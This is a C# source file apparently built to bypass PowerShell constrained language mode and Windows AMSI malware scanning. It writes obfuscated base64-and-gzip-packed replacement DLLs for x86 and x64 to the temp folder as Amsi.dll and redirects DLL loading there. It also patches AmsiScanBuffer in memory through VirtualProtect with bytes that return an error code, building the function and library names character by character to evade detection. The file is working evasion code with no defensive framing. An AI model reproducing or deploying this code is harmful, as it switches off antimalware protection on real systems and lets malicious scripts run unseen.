using System;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;


namespace PsBypassCostraintLanguageMode
{
    class AmsiBypass
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SetDllDirectory(string lpPathName);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[4096];
                int read;

                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }

                return resultStream.ToArray();
            }
        }

        public static byte[] Base64_Decode(string encodedData)
        {
            byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
            return encodedDataAsBytes;
        }

        public static void Amsi(string arch)
        {
            BinaryWriter bw;

            string AmsiX86 = "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";
            string AmsiX64 = "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";

            string TempFolder = Path.GetTempPath();
            SetDllDirectory(TempFolder);

            bw = new BinaryWriter(new FileStream(TempFolder + "\\Amsi.dll", FileMode.Create));
            if (arch == "AMD64")
            {
                byte[] decoded = Base64_Decode(AmsiX64);
                byte[] decompressed = Decompress(decoded);
                bw.Write(decompressed);
            }
            else
            {
                byte[] decoded = Base64_Decode(AmsiX86);
                byte[] decompressed = Decompress(decoded);
                bw.Write(decompressed);
            }
            bw.Close();
        }

        public static int Disable()
        {
            char[] chars = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' };
            String funcName = string.Join("", chars);

            char[] chars2 = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' };
            String libName = string.Join("", chars2);

            IntPtr Address = GetProcAddress(LoadLibrary(libName), funcName);

            UIntPtr size = (UIntPtr)5;
            uint p = 0;

            VirtualProtect(Address, size, 0x40, out p);
            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(Patch, 0, Address, 6);

            return 0;
        }
    }
}
